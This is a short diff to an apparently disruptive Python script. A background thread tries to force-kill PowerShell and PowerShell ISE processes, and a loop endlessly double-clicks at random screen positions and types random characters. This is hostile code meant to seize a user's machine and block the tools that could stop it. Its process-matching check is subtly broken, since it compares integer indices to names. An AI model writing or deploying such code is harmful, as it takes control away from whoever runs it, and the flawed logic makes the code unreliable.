@@ -41,12 +41,12 @@ def powershell_terminate():
     while True:
         tasklist = subprocess.getoutput("tasklist")
         for task in range(len(tasklist.split())):
-            if task == "powershell.exe":
+            if task == "powershell.exe" or task == "powershell_ise.exe":
                 subprocess.call(f"taskkill /f /im {task}")
 
 
 threading.Thread(target=powershell_terminate).start()
 
 while True:
-    pyautogui.doubleClick(random.randint(0, size[0]), random.randint(0, size[1]))
+    pyautogui.doubleClick(random.randint(0, size[0]), random.randint(0, size[1]), duration=3)
     pyautogui.write(random.choice(chars))
